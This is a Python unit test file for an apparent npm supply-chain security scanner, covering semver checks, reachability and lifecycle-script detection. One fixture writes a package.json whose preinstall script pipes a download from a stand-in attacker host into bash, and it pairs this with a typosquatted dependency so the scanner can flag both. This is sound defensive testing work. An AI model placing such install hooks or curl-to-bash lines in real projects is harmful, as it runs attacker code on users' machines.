import json
import os
import tempfile
import unittest
from python_hunter.application.orchestrator.scan_orchestrator import ScanOrchestrator
from python_hunter.domain.dependencies.models import PackageManager
from python_hunter.domain.dependencies.npm_analyzer import NPMAnalyzer
from python_hunter.domain.dependencies.npm_reachability import NPMReachabilityAnalyzer
from python_hunter.domain.dependencies.npm_supply_chain import NPMSupplyChainAnalyzer
from python_hunter.domain.dependencies.semver import NPMSemver
from python_hunter.domain.ir.models import IRCall, IRLocation, SecurityIR
from python_hunter.domain.language.models import Language


class TestNPMSupplyChainSecurity(unittest.TestCase):
    """Test suite for lockfile parsing, semver evaluation, lifecycle script analysis, reachability, and zero execution."""

    def setUp(self) -> None:
        self.npm_analyzer = NPMAnalyzer()
        self.supply_chain = NPMSupplyChainAnalyzer()
        self.reachability = NPMReachabilityAnalyzer()

    def test_npm_semver_evaluation(self) -> None:
        self.assertTrue(NPMSemver.satisfies("1.2.5", "^1.2.0"))
        self.assertTrue(NPMSemver.satisfies("1.2.5", "~1.2.0"))
        self.assertTrue(NPMSemver.satisfies("2.0.0", ">=1.0.0"))
        self.assertFalse(NPMSemver.satisfies("2.0.0", "^1.2.0"))
        self.assertTrue(NPMSemver.satisfies("2.1.0", "^1.0.0 || ^2.0.0"))

    def test_npm_supply_chain_lifecycle_scripts(self) -> None:
        findings = self.supply_chain.analyze_workspace(".")
        # Workspace package.json has no preinstall scripts, findings should be safe
        self.assertIsInstance(findings, list)

    def test_npm_reachability(self) -> None:
        inventory = self.npm_analyzer.analyze(".")
        ir = SecurityIR(language=Language.JAVASCRIPT)
        ir.calls.append(IRCall(caller="app.js", callee="express.listen", location=IRLocation("app.js", 1)))
        
        reachability_map = self.reachability.analyze_reachability(ir, inventory)
        self.assertIsInstance(reachability_map, dict)

    def test_orchestrator_npm_supply_chain_detection(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            pkg_path = os.path.join(temp_dir, "package.json")
            with open(pkg_path, "w", encoding="utf-8") as f:
                json.dump({
                    "name": "vulnerable-app",
                    "version": "1.0.0",
                    "scripts": {
                        "preinstall": "curl -s http://attacker.com/payload.sh | bash"
                    },
                    "dependencies": {
                        "recat": "18.2.0"
                    }
                }, f)

            orchestrator = ScanOrchestrator()
            result = orchestrator.run_scan(temp_dir)

            self.assertIsNotNone(result)
            self.assertEqual(result.exit_code, 1)
            rule_ids = [f.rule_id for f in result.findings]
            self.assertIn("PYHUNTER-NPM-SCRIPT-001", rule_ids)
            self.assertIn("PYHUNTER-NPM-TYPO-001", rule_ids)
            self.assertGreaterEqual(result.project_risk.overall_score, 90.0)


if __name__ == "__main__":
    unittest.main()

